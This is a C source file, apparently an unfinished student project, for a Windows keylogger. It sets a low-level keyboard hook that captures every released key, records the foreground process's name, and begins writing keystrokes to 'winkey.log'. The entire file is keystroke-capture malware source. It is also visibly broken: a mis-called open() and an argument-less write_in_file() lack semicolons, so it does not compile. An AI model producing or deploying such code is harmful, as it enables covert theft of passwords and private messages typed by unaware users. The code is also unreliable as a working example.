#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include <winsvc.h>
#include <psapi.h>

void	AffProcessName(DWORD processID)
{
	char	szProcessName[MAX_PATH] = "<inconnu>";

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);

	if (hProcess) {
		HMODULE hmod;
		DWORD	cbNeeded;

		if (EnumProcessModules(hProcess, &hmod, sizeof(hmod), &cbNeeded))
			GetModuleBaseNameA(hProcess, hmod, szProcessName, sizeof(szProcessName));
		CloseHandle(hProcess);
	}

	printf("PID %lu: %s\n", processID, szProcessName);
}

int    forground_process()
{
	HWND    hwnd;
	DWORD   pid;

	hwnd = GetForegroundWindow();

	if (!hwnd) {
		printf("no foreground process detect\n");
		return 1;
	}

	GetWindowThreadProcessId(hwnd, &pid);
	AffProcessName(pid);

	/*printf("hwnd: %p\n", (void*)hwnd);
	printf("pid: %lu\n", (unsigned long)pid);*/
	return 0;
}

LRESULT CALLBACK foo(int ncode, WPARAM wparam, LPARAM lparam)
{
    int vkCode = ((KBDLLHOOKSTRUCT *)lparam)->vkCode;

    if (wparam == 257) // when released
    {
        if (vkCode >= 65 && vkCode <= 90)
            printf("Pressed: %c\n", vkCode);
        else
            printf("Pressed: <%u>\n", vkCode);
    }
	forground_process();

    return (CallNextHookEx(NULL, ncode, wparam, lparam));
}

int	create_file(const char *path) {
	int fd = creat(path, 0644);
	if (fd == -1)
	{
		perror("Can't create file");
		return 1;
	}
	return 0;
}

int write_in_file(const char *path, const char *msg)
{
	FILE *file = open(path, "a")
	if (!file) {
		perror("can't open file");
		return 1;
	}

	if (fprintf(file, "%s\n", msg) < 0) {
		perror("error");
		fclose(file);
		return 1;
	}
	if (fclose(file) != 0) {
		perror("error close file");
		return 1;
	}
	return 0;
}

int main(void)
{
    HHOOK hook = SetWindowsHookEx(
        WH_KEYBOARD_LL, // Type de hook
        foo,            // Fonction a appeler
        NULL,            // Ou trouver la fonction (null car osef)
        0);                // Thread ID
    MSG msg;

    if (hook == NULL)
    {
        printf("Failed to install hook: %ld\n", GetLastError());
        return 1;
    }

    printf("Hook ok: %p\n", (void*)hook);
	create_file("winkey.log");
	write_in_file()
    while (GetMessage(&msg, NULL, 0, 0))
    {
        //forground_process();
        TranslateMessage(&msg); // jsp ca fais quoi sah
    }
    printf("haha\n");
}